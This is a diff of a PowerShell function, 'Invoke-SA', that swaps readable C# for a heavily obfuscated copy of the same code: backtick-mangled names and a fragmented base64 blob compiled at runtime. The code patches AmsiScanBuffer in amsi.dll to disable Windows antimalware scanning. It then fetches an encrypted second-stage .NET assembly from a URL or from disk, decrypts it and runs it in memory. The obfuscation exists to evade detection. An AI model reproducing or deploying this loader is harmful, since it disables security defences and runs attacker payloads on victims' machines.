@@ -3,300 +3,42 @@ function Invoke-SA
 
 Param
     (
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory=${tR`Ue})]
         [string]
-        $location,
-        [Parameter(Mandatory=$true)]
+        ${lOc`ATi`ON},
+        [Parameter(Mandatory=${T`Rue})]
 	    [string]
-        $password,
+        ${p`A`sSwORd},
         [string]
-        $argument,
+        ${aR`g`UmenT},
         [string]
-        $argument2,
+        ${ARg`UmE`Nt2},
         [string]
-        $argument3,
+        ${A`RGU`M`EnT3},
         [Switch]
-        $noArgs
+        ${N`Oa`RgS}
 	)
-Invoke-BETW
+i`NVo`KE-bEtW
 
-$SA = @"
-using System;
-using System.Net;
-using System.Text;
-using System.IO;
-using System.Linq;
-using System.Reflection;
-using System.Security.Cryptography;
-using System.IO.Compression;
-using System.Runtime.InteropServices;
+${SA`64} = ("{240}{138}{105}{151}{190}{14}{46}{318}{296}{294}{230}{301}{171}{258}{226}{329}{281}{130}{277}{238}{5}{52}{197}{173}{347}{221}{209}{336}{248}{122}{99}{182}{83}{222}{241}{107}{2}{119}{98}{131}{147}{304}{27}{67}{40}{207}{66}{374}{47}{192}{145}{92}{162}{276}{307}{313}{208}{44}{9}{62}{111}{51}{200}{205}{210}{88}{315}{32}{194}{291}{72}{79}{143}{126}{326}{235}{373}{193}{167}{58}{80}{343}{223}{70}{299}{13}{247}{95}{234}{187}{127}{19}{157}{370}{71}{38}{136}{69}{176}{55}{302}{22}{123}{8}{163}{6}{1}{78}{349}{37}{189}{169}{310}{322}{246}{342}{259}{317}{188}{321}{227}{253}{339}{179}{31}{10}{278}{21}{362}{7}{165}{90}{91}{148}{33}{24}{255}{76}{96}{354}{117}{319}{372}{77}{311}{191}{129}{293}{85}{316}{134}{100}{149}{199}{39}{287}{300}{139}{175}{358}{225}{323}{11}{81}{331}{0}{308}{180}{29}{254}{325}{112}{324}{186}{303}{344}{152}{53}{35}{118}{335}{272}{57}{125}{327}{155}{153}{25}{42}{239}{348}{242}{268}{202}{124}{369}{341}{292}{295}{360}{288}{185}{132}{334}{63}{273}{82}{184}{26}{214}{340}{320}{363}{183}{23}{87}{68}{113}{41}{284}{236}{267}{271}{263}{216}{220}{50}{135}{256}{219}{229}{215}{309}{18}{178}{371}{140}{264}{15}{298}{265}{74}{305}{142}{36}{54}{233}{94}{4}{146}{352}{232}{249}{195}{84}{366}{353}{75}{108}{16}{17}{89}{12}{244}{367}{365}{275}{137}{289}{368}{262}{170}{328}{133}{285}{218}{312}{257}{30}{28}{228}{282}{86}{356}{160}{93}{73}{204}{121}{106}{49}{60}{297}{245}{161}{361}{280}{338}{110}{203}{144}{290}{59}{346}{251}{260}{213}{345}{172}{56}{104}{45}{243}{351}{159}{283}{198}{158}{250}{20}{156}{65}{261}{231}{166}{350}{337}{332}{279}{64}{61}{359}{164}{120}{109}{48}{206}{97}{196}{168}{364}{355}{174}{103}{114}{224}{269}{154}{286}{211}{330}{357}{116}{177}{333}{314}{266}{274}{3}{115}{150}{43}{212}{128}{181}{101}{201}{306}{237}{217}{141}{34}{270}{252}{102}" -f'yeVN0cmVhbS','gICAgQ29uc29sZS5Xcml0ZUxpbmUoKTsNCiAgICAgICAgfQ0KICAgI','sID0gIi5kbGwiOw0KICAgICAgICAgICAgICAgIHZ','GJ5dGVbYnl0ZXNE','bGljIHN0YXRpYyBieXRlW10gQmFzZTY0X0R','YyBzdGF0aWMgdm9pZCBub3coKQ0KICAgICAgICB7DQogICAgICAgIC','igpDQogICAgICAgIHsNCiAgICAgICAgICA','IFN0cmluZy5FbXB0eTsNCiAgICA','AgICAgIH0NCiAgICB9DQogICAgcHVibGljIGNsYXNzIFByb2dyYW0NCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMg','bGRQcm90ZWN0KTsNCg0KICAgICAgICAgICAgICAgIE1hcnNoYWwuQ2','XRSZXNwb25zZSgpOw0KICAgICAgICAgICAgICAgIFN0cmVhbSBkYXRhID0gcmVzcG9uc2UuR2V0UmVz','ZGVjcnlwdGVkQnl0ZXMgPSBudWxsOw0KICAgICAgICAgICAgYnl0ZVtdIHNhbHR','ZSk7DQogICAgI','Rlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJ','1cml0eS5DcnlwdG9ncm','J1ZmZlciA9IG5ldyBieXRlWzMyNzY4XTsNCiAgICAgICAgICAgICAgICBpbnQgcmVhZDsNCiAgICAgICAgI','iAgICAgI','CAgICAgIENvbnNvbGVLZXlJbmZvIGluZm8gPSBDb25zb2xl','HJlYW','0RsbEltcG9yd','CAgICAgICBDb25zb2xlLldyaXRlTGlu','CAgICAgICAgICAgI','gdWludCBscGZsT2xk','CAgICAgICB9DQogICAgICAgICAgICB9D','gICAgICAgICA','Mg','CAgICAgIEN','CAgdmFyIEFtID0gIkF','k7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlKCIgIik7D','w0KICAgICAgICAgI','0gQ29uc29sZS5DdXJzb3JMZWZ0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5TZXRDdXJzb3JQb3NpdGlvbihwb3MgLSAxLCBDb25zb2xlLkN1cnNvclRvcC','2UgPSAoSHR0cFdlYlJlc3BvbnNlKW15V2ViUmVxdWVzdC5HZ','AgICB9DQo','CAgICAgICAgcmV0dXJuIGh0bWw7DQo','RvQXJyYXkoKTsNCiAg','JkQnl0ZXMsIHNhbHRCeXRlcywgMTAwMCk7DQogICAgICAgICAgICAgICAgICAgICAgICBBRVMu','uV3JpdGUoYnVmZmVyLCAwLCByZWFkKTsNCiAg','IHsNCiAgICAgIC','h0ZXJu','b0JpbmFyeSk7DQogICAgICAgICAgI','AgIC','pDQogI','PSBuZXcgQ3J5cHRvU3RyZWFtKG1zLCBBRVMuQ3JlYXRlRGVjc','gICAgICAgICBmb3IgKGludCBpID0gX3NhbHRTa','v','2b2lkIE1ha','FwaH','QogICAgIC','WdlMiA9IEdldF9TdGFnZTJkaXNrK','saWMgc3RhdGljI','jb21wcmVzcyhieXRlW10gZGF0YSkN','IGNhdGNoIChFeGNlcHRpb24gZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgI','AgICBpZiAoaXM2NEJpdCgpKQ0KICAgICAgI','3','ICAgICAgICAgICAgICB9DQogICAgICAgI','cmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvd','AgICAgcHVibGljI','ICAgICAgICAgICAgICAgICBBRVMuSVYgPSBrZXku','Ow','ICAgICAgICAgICAgI','HZvaWQgbG9hZEFzc2VtYmx5KGJ5dGVbXSBiaW4sIG','KICAgICAgICAgICAgfQ0KIC','9weShwYXRjaCwgMCw','CB9DQogICAgICAgICAgICAgICAgICAgIGNh','dldF9TdGFnZTIobG9jYXRpb24pOw0','AgICBzdHJpbmcgbG','2lTY2FuID0','tIjsNCiAgICAgICAgICAgIC','NCiAgICAgICAgcHVibGljIGJ5dGVbXSBHZXRSYW5','3QoSW50UHR','BXaW4zMg0KICAgICAgICB7DQo','0aWMgZX','GF0aWMgYm9vbCBpczY0Qml0KCkNCiAgICAgI','AgQ29uc29sZS5Xcml0ZUx','AsIGJ1ZmZlci5MZW5ndGgpKSA+IDApDQogICAgICAgICAgICAgICAgew0','AgICAgICBzdHJpbmc','AgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbnNvbGUuRm9yZWdyb3VuZENvbG9yID0gQ29uc29sZUNvbG9yLlJlZDsNCiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgpOw0KICAgICAgIC','gfQ0KICAgICAgICB9DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3Ry','CAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRfU3','CAgew0KICAgICAgICAgICAgYm9vbCBpczY0Qml0ID0','0KDQogICAgICAgICAgICByZXR','CeXRlcyA9IG5ldyBieXRlW10','CAgICAgI','ICAgICAgICAgICAgICAgdmFyIHNpID','mV0dXJuIGVuY29kZWREYXRhQXNCeXRlczsNCiAgICAgICAgfQ','eSA9IGZpbGVwYXRoOw0KIC','tIDEsIENvbnNvbGUuQ3Vyc29yVG9wKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0N','QogICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkQnl0ZXM7DQogICAgICAgIH0','CAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCIgW3hdIHswfSIsIGUuSW5uZXJFeGNlcHRpb24pOw0KICAgICAgICAgIC','LlJlYWRLZXkodHJ1','CAgICB1c2luZyAoU3RyZWFtUmVhZGVyIHNyID0gbmV3IFN0cmVhbVJlYWRlcihkYXRhKSkNCiAg','ICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGh0bWwgPS','HJlc3MobGliL','0KICAgICAgICAgICAgfQ0KICAgICAgICAgIC','hbS5Ub0FycmF5KCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcHVi','ICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KIC','AgICAgICAgIEN','gICAgICAgIH0NC','aWIgPSBXaW4zMi5Mb2FkTGlicmFyeSh','ICJhbSI7DQo','lYWRBbGxUZXh0KGZvbGRlc','CAgICAgIG','0=','gICBDb25zb','HN0YXRpYyB','0Ow0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLkxpbn','ICBwdWJ','IgZGx','gcGFzc3dvcmQgPSAiIjsNC','IENvbnNvbGUuV3JpdGUoIlsqXSBmcm9tIGRpc2suICIpOw0KICAgICAgICAgICAgICAgIFN0Y','ICAgICAgICB7DQogICAgICAgI','gYWRkciwgcGF0Y2guTGVuZ3RoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAg','CgpKQ0KICAgICAgICAgICAgICAgIHsNCiAgIC','kb21CeXRlcyg','2xlLldyaXRlTGluZSgpOw0KICAgICAgICAgICAgQ29uc29sZS5Xcml0Z','Lkxlbmd0a','gICAgICAgICAgIC','blshXSBiYWQgdXJsLiIpOw0KICAgICAgICAgICAgICAgIENvbnNvbGUuUmVzZXRDb2xv','S2V5ID0ga2V5LkdldEJ5dGVzKEFF','hciBs','CAgICAg','AgfQ0KICAgICAg','gICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgYSA9','UHJvdGVjdCk7DQogIC','N','R2V0','ICAgICAgIC','uZyBuYW1lKTsNCg0KICAgICAgICAgICAgW','ELkxlbmd0aDsgaSsr','AgICA','IGJ5dG','hK3NpK2RsbCk','lY3J5cHRlZEJ5dGVzID0gbXMuVG9BcnJheSgpOw0KICAgICAgICAgICAg','BpZiAoIXN0cmluZy5Jc051bGxPckVtcHR5KHBhc3N3','ICAgICAgc3RyaW5nIGJhc2U2NCA9IFN5c3RlbS5JTy5GaWxlLlJ','CiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgKHZhciBj','IGJvb2wgVmlydHVhbFByb3RlY','gICAgICAgICBDb25zb2xlLldyaXRlK','DsNCnVzaW5nIFN5c3RlbS5UZXh','VbXSBieXRlc1RvQmVEZWNyeXB0ZW','gICAgICAg','10gY21kID0gYXJncy5Ta2lwKDIpLl','RTdHJlYW0','gdHJ1ZTsNCg0K','udWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgI','CAgICAgICAgdmFyIEJ1ZmZlciA9ICJCdWZmZXIiOw0KICAgICAgICAgICAgICAgIHZhciBhZGRyID0gV2luMzIuR2V0UHJvY0FkZ','lY29kZShz','7DQogICAgICAgICAgICAg','Bzci5SZWFkVG9FbmQoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgI','lBhdGh','CAtIF9zYWx0U2l6ZV07DQogICA','E7DQp1c2luZyBTeXN0ZW0uUmVmbG','J5dGVzKHBhc3N3b','Lk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzaW5nICh2YXIgY3','GUoU3RhZ2UyKTsNCiAgICAgICAgICAgIGJ5dGVbXSBkZWNvbXByZXNzZWQgPSBEZWNvb','ICAgICAgICAgICAgICAgQUVT','ZSgiUGFyYW1ldGVycyBtaXNzaW5nIik7DQogICAgICAgICAgICB9DQogICAgICAgIC','Cgia2VybmVsMzIiKV0NCiAgICAgICAgICAgIHB1Ym','CAgICAgICAgIHsNCiAgICAgIC','ZiAoYXJnc','gQ29uc29sZS5SZWFkS2V5KHRydWUpOw','ICAgICBnb2Yw','CBBbStzaVNjYW4rQnVm','dm9pZCBQcmludEJhbm5lc','ICAgICAgICAgICAgew0KICAgICAgICAgI','gICAgICAgI','ICAgICAgICAgICAgc3RyaW5nIGlzaHR0cCA9ICJodHRwIjsNCiAgICAgICAgICAgIHN0cmluZyBTdGFnZTI7DQogICAgICAgICAgICBpZiAob','CA9IGZhbHNl','ICAgICAgICAgIENvbnNvbGUuV3Jp','HRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEh0dHBXZWJSZX','ICAgew0KICAg','B1Ymx','gICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgIC','AgICAg','CAgICA','QsIGJ5dGVbXSBwYXNzd2','yIGxwQWRk','BieXRlW10gYnl0ZXNEID0gQUVTX0RlY','0gPSBuZXc','zdC5Qcm94eSA9IHdlYlByb3h5Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBIdHRwV2ViUmVzcG9uc2UgcmVzcG9uc','ICAge','KQ0KICAgICAgICAgICAgew0KICAgICAgICAgI','g','29sZS5SZXNldENvbG9yKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgI','CAgIHsNCiAgICAgICAgICAgICAgICAgI','gICAgICAgICAgIGR','ICAgICAgIEFFUy5LZXlTaXplID0gMjU2Ow0KICAgICAgICAgICAgICAgICAgICAgICA','0UHRyIExvYWRMaWJyYXJ5KHN0cml','gICAgICAgICAgICAgICAgIHdlYlByb','AgICAgI','VjdGlvbjsNCnVzaW5nIFN5c3RlbS5TZWN','IC','AgI','gICAgICAgICAgICAgICAgaXM2NEJpd','NCi','FzQnl0ZXMgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZW5jb2RlZERhdGEpOw0KICAgICAgICAgICAgc','iAg','CAgIC','iAgI','U','CAgICBDb','9yaWdCW2kgLSBfc2FsdFNpemVdID0gYnl0ZXNEW2ldOw0','CAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG','CAgICAgICAgTWV0aG9kSW5mbyBtZXRob2QgPSBhLkVudHJ5UG9pbnQ7DQogICAgICAgICAgICAgICAgaWYgKG1ldGhvZCAhPSB','pbmUoKTsNCiAgICAgICAgICAgIHJldHVybiBwYXNzd29yZDsNCiAgICAgIC','2','GxvY2F0aW9uKTsNCiAgICA','B2YXIgc','CB','dGUgc3RhdGljIHZvaW','5zb2xlLldyaXRlTGluZSgiIFt4XSB7MH0iLCBlLk1lc3NhZ2UpOw0KICAgICAgI','Bhc3N3b3Jk','XplOyBpIDwgYnl0ZXN','ICAgICAgICAgICAgbWV0aG','vbnNvbGUuRm9yZWdyb3VuZENvbG9yID0gQ29uc29sZUNv','5Nb2RlLkRlY29tcHJlc3','7DQogICAgICAgICAgICByZXR','CAgICAgb2JqZWN0W','ICAgICAgICAgICAgICA','ShkYXRhKSkNCiAgICAgICAgICAgIHVzaW5nICh2YXIgemlwU3RyZWFtID0gbmV3IEdaaXBTd','1cm4gYmE7DQogICAgICAgIH0NCiAgICAgICAgcHVibGljIHN0YXRpYyBieXRlW10gRGV','HNlDQogICAgICAgICAgICAgICAgZ29mb3IoeDg2KTsNCiAgICAgICAgfQ0KDQogICAgICAgIHByaXZh','0gInNpIjsNCiAgICAgICA','Fzcy','SgiWypdIERlY3J5cHRpbmcuICIpOw0KICAgICAgICAgICAgc3RyaW5nIFBhc3N3b3JkID0gYXJnc1sxXTsNCiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCk7DQogICAgICAgICAgICBieXRlW10gZGVjb2RlZCA9IEJ','AgICAgICB7DQo','YXRpYyBieXRlW10geDY0ID0gbmV3IGJ5dGVbX','JrQ3JlZGVudGlhbHM7D','QogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLlNldEN1cnNvclBv','HJlYW0oY29tcHJlc3NlZFN0cmVhbSwgQ29tcHJlc3Npb2','5JbnRlcm9wU2VydmljZXM7DQoNCm5hbWVzcGFjZSBTQQ0Kew0KIC','dOw0K','ICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBlbmNvZGVkRG','CAgICAgICAgcmV0dXJuIHJlc3VsdFN0cmV','AgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW5','gKE','Ow0KICAgICAgIC','ICAgICAgfQ0KICAgICAgI','ogICAgICAgIHB1Ymxp','nlwdG9yKCksIE','dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ld','gICAgICAgICB2YX','V3JpdGUpKQ0KICAgICAgI','W4ocGFyYW1zIHN0cmluZ1tdIGFyZ3MpDQogICAgICA','CAgICA','W1hbmRzKQ0KICAgICAgICB7DQogICAgICAg','0ZSh1cmwpOw0KIC','pbmcgcHJvY05hbWUpOw0KDQogICAgICAgICAg','ZVtdIHBhdGNoKQ0KICA','F0YU','AgI','PSBhLkNyZWF0ZUluc3Rhb','H0NCn','QogICAgICAgICA','CAgICAgIHVzaW5nIChSaWpuZGFlbE1hbmF','gICB9DQogIC','b21wcmVzc2VkU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhb','zdHJpbmcoMCwgcGFzc3dvcmQuTGVuZ3RoIC0gMSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpbnQgcG9zID','pYyBjbGFzcyBnb2YwcjRtNWwNCiAgICB7DQogICAgICAgIHN0','gICAgICAgICAgICAgIElXZWJQcm94eSB3ZWJQcm94eSA9IG15V2ViUmVxdWVzdC5Qcm94eTsNCiAgICAgICAgICAgICAgICBpZiAod2ViUHJveHkgIT0gbnVs','mNlKG1ldGhvZC5OYW1lKTsNCiAgICAgICAg','9jYXRpb24gPSBhcmdzWzB','DQogICAgICAgICAgICAgICAgZWxzZSBpZiAoaW5mby5LZXkgPT0gQ29uc29sZUtleS5CYWNrc3BhY2UpDQogICAgICAgICAgICAg','yeXB0b1NlcnZpY2VQcm92aWRlci5DcmVhdGUoKS5HZXRCeXRlcyhiYSk','ICAgdmFyIG','YWQgPSB6aXBTdHJlYW0uUmVhZChidWZmZXIsID','WdCID0g','AgICAgYnl0ZVtdIGJhID0gbmV3IGJ5dGVbX3NhbHRTaXplXTsN','CAgICAgI','hc2U2NF9EZWNvZ','ICAgICAgICAgIGxvYWRBc3NlbWJseShvcmlnQiwgY21kKTsNCiAgICAgICAgfQ0KICAgI','CiAgICAgICAgICAgIFJOR0N','ICAgICAg','dGNoDQogICAgICAgICAgI','bmV3I','gICAgICAgICAgew0KICAgICAgICAgICA','ZmV','VbXSB4ODYgPSBuZXcgYnl0ZVtdIHsgMHhCOCwgMHg1NywgMHgwMCwgMHgwNywgMHg4MCwgMHhDMiwgMHgxOCwgMHgwMCB9Ow0KDQ','cG9uc2VTdHJlYW0oKTsNCiAgI','CAgIFN0YWdlMiA9IE','ICAgICAgICAgI','AgICAgICAgc3RhdGlj','c2l0aW9uKHBvcyA','y5MZW5ndGggIT0gMikNC','CAgICAgIHsNCiAgICAgICAgICAgIGludCBfc2FsdFNpemUgPSA0','b3JkKSkNCiAgICAg','XByZXNzKGRlY29kZWQpOw0KICAgICAgICAgICAgYnl0ZVtdIH','CByZXR1cm4gYmFzZTY0Ow0KICAgICAgICB9DQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIEFFU','ICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICA','CIqIik7DQogICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkICs9IGluZm8uS2V5Q2hhcjsNCiAgICAg','CAg','AgICAgICAgcHJpdmF0ZSBzd','jcnlwdGVkLkxlbmd0aCk7DQogICAgICA','gew0KICAgICAgICAgICAgc3RyaW5nIGZvbGRlclBhdGhUb0JpbmFy','uZyBTeXN0ZW0uUnVudGltZS','gICAgICAgICAgICAgICAgICAg','8uQ29tcHJlc3Npb247DQp1c2l','9iamVjdFtdIGNvb','CAgICAgICB3aGlsZSAoKHJl','gICAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleH','19EZWNyeXB0KGJ5dG','AgIH','XQ','gQU','I','KICAgICAgICAgICAgICAgICAgICByZXN1bH','KICAgICAg','yKTsNCg0KICAgICAgICAgICAgICAgIHVpbnQgb2xkU','gpKQ0KICAgICAgICAg','MpKQ0KICAgICAgICAgICAgdXNpbmcgKHZhciByZXN1bHRTd','F1ZXN0I','aW5nIEdldF9TdGFnZTJkaXNrKHN0cmluZyBmaWxlcGF0aCkNCiAg','gew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBwYXNzd29yZC5TdWJ','HJvdGVjdDsNCiAgICAgICAgICAgICAgICBXaW4zMi5WaXJ0dWFsUHJvdGVjdChhZGRyLCAoVUludFB0cilwYXRjaC5MZW5ndGgsIDB4NDAsIG91d','IGludCBfc2FsdFNpemUgPSA0Ow0KICAgICAgICAgICAgYnl0ZVtdIG9ya','AgfQ0KICAgIC','AgICAg','bCkNCiAgICAgICAgICAgICAgICB7DQogICA','k7DQp1c2luZyBTeXN0ZW0uSU','cigpOw0KICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAg','mFkIHBhc3N3b3JkLiIp','3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3','G15V2ViUmVxdWVzdCA9IChIdHRwV2ViUmVxdWVzdClXZWJSZXF1ZXN0LkNyZWF','gICAgICAgICAgICBieXRlW10g','AgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAg','nZWQgQUVTID0gbmV3IFJpam5kYWVsTWFuYWdlZ','AgICAgaWY','Qnl0ZXMoQUVTLkJsb2NrU2l6ZSAvIDgpOw0KICAgICAgICAg','ICAgICAgICAgICAgICAgIC','SB7IDB4QjgsIDB4NTcsIDB4MDAsIDB4MDcsIDB4ODAsIDB4QzMgfTsNCi','Qnl0ZXMgPSBFbmNvZGluZy5VVEY4LkdldEJ5dGVzKFBhc3N3b3','geyAxLCAyLCAzLCA0LCA1LCA2LCA3LCA4IH07DQogICAgICAgICAgICB1c2luZyAoTWVtb3J5U3RyZWFtIG1zID0gbmV3IE1lbW9','CIpOw0KICAgICAgICAgICAgI','3J5cHQoZGVjb21wcmVzc2VkLCBwYXNzd29yZEJ5dGVzKTsNCiAgICAgICAgICAg','ICAgICAgI','Uy5LZXlTaXplIC8gOCk7DQog','QgZ29mb3IoYnl0','vbnNvbGUuV3JpdGUoIlsqXSBjaGVja2luZyBVUkwuI','GNhdGNoDQogICAg','gICAgICAgICAgIG15V2ViUmVxdWV','bG9yLlJlZDsNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gY','0JlRGV','A','1cm4gaXM2NEJpdDsNCiAgICAgICAgfQ0KICAgICAgICBjbG','VTLkJsb2NrU2l6ZSA9IDEyODsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBrZXkgPSBuZXcgUmZjMjg5OERlcml2ZU','9kLkludm9rZShvLCBudWxsKTsNCiA','CAgb2JqZWN0IG8g','IGdvZm9yKHg2NCk7DQogICAgICAgICAgICBlb','NyeXB0b1N0cmVhbU1vZGUu','RhZ2UyKHN0cmluZyB1cmwpDQogICAgICAg','G9jYXRpb24uU3RhcnRzV2l0aChpc2h0dHApKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEN','gIHsNCiAgICAgICAgICAgIFByaW50QmFubmVyKCk7DQogICAgICAgICAgICBp','dHJpbmcgZW5jb2RlZERhdGEpDQogICAg','CBwdWJsaWMgc3RhdGljIHN0cmluZyBSZWFkUGFzc3dvcmQoKQ0KICAgICAgICB7DQogICAgIC','vbnNvbGUuV3JpdGVMaW5lKCJc','lIik7DQogICAgI','CiAgICAgICAgICAgICAgICBpbmZvID0','JkKTsNCiAgICAgICAgICAgIHBhc3N3b3JkQnl0ZXMgPSBTSEEyNTYuQ3JlYXRlKCkuQ29tcHV0ZUhhc2gocGFzc3dvcmRCeXRlcyk7DQo','9yZEJ5dGVzKQ0KIC','AgICAgICAgICAgZWxzZQ0K','ICAgY3MuQ2xvc2UoKTsNCiAgICAgICAg','cjRtNWwubm93KCk7DQogICAgICAgICAgICBBc3NlbWJseSBhID0gQXNzZW1ibHkuTG9hZChiaW4pOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYS5FbnRyeVBvaW50Lkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBjb21tYW5kcyB9KTsNCiAgICAgICAgICAgIH0NCiAg','CBzdHJpbmcgaHRtbCA9','Ow0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uc','dGVMaW5lKCItPiBEb25','y5LZXkgIT0gQ29uc29sZUtleS5FbnRlcikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoaW5mby5LZXkgIT0gQ29uc29sZUtleS5CYWNrc3BhY2UpDQogICAgICA','0KICAgICAgI','gICB3aGlsZSAoaW5mb','ICAgICAgICAgICB9','zLldyaXRlKGJ5dGVzVG9CZURlY3J5cHRlZCwgMCwgYnl0ZXNUb','xpYyBzdGF','gTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICB7DQogICAgICA','ICAgICA','ludFB0ci5TaXplID09IDQpDQo','gInNpU2NhbiI7D')
+${S`AB} = [Convert]::FromBase64String(${S`A64})
+${Sa} = [System.Text.Encoding]::ASCII.GetString(${s`AB})
 
-namespace SA
-{
-    public class gofor4msi
-    {
-        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+adD-t`Y`pe -TypeDefinition ${SA}
 
-        public static void now()
-        {
-            if (is64Bit())
-                gofor(x64);
-            else
-                gofor(x86);
-        }
-
-        private static void gofor(byte[] patch)
-        {
-            try
-            {
-                var a = "am";
-                var si = "si";
-                var dll = ".dll";
-                var lib = Win32.LoadLibrary(a+si+dll);
-                var Am = "Am";
-                var siScan = "siScan";
-                var Buffer = "Buffer";
-                var addr = Win32.GetProcAddress(lib, Am+siScan+Buffer);
-
-                uint oldProtect;
-                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
-
-                Marshal.Copy(patch, 0, addr, patch.Length);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(" [x] {0}", e.Message);
-                Console.WriteLine(" [x] {0}", e.InnerException);
-            }
-        }
-
-        private static bool is64Bit()
-        {
-            bool is64Bit = true;
-
-            if (IntPtr.Size == 4)
-                is64Bit = false;
-
-            return is64Bit;
-        }
-        class Win32
-        {
-            [DllImport("kernel32")]
-            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-            [DllImport("kernel32")]
-            public static extern IntPtr LoadLibrary(string name);
-
-            [DllImport("kernel32")]
-            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        }
-    }
-    public class Program
-    {
-        public static void PrintBanner()
-        {
-              Console.WriteLine();
-        }
-        public static string Get_Stage2(string url)
-        {
-            try
-            {
-                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
-                IWebProxy webProxy = myWebRequest.Proxy;
-                if (webProxy != null)
-                {
-                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
-                    myWebRequest.Proxy = webProxy;
-                }
-                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
-                Stream data = response.GetResponseStream();
-                string html = String.Empty;
-                using (StreamReader sr = new StreamReader(data))
-                {
-                    html = sr.ReadToEnd();
-                }
-                return html;
-            }
-            catch (Exception)
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine();
-                Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
-                Console.ResetColor();
-                return null;
-            }
-        }
-        public static string Get_Stage2disk(string filepath)
-        {
-            string folderPathToBinary = filepath;
-            string base64 = System.IO.File.ReadAllText(folderPathToBinary);
-            return base64;
-        }
-        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
-        {
-            byte[] decryptedBytes = null;
-            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
-            using (MemoryStream ms = new MemoryStream())
-            {
-                using (RijndaelManaged AES = new RijndaelManaged())
-                {
-                    try
-                    {
-                        AES.KeySize = 256;
-                        AES.BlockSize = 128;
-                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
-                        AES.Key = key.GetBytes(AES.KeySize / 8);
-                        AES.IV = key.GetBytes(AES.BlockSize / 8);
-                        AES.Mode = CipherMode.CBC;
-                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
-                        {
